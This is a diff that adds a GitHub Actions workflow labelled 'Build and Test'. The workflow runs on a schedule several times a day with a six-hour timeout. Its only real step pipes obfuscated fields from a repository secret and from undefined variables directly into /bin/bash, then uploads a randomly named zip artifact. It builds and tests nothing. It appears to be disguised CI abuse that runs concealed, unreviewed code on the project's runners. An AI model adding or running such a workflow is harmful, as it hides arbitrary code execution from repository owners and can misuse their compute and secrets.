@@ -1,0 +1,29 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          w5: ${{ secrets.w5 }}
+        run: |
+          printf '%s' "$w5" | jq -r .fcwo0235 | /bin/bash
+          echo $k46817 | jq -r .qia37086 | /bin/bash
+          printf '%s' "$lov909" | jq -r .c2 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZlvN65GV
+          path: "*.zip"
+          retention-days: 1
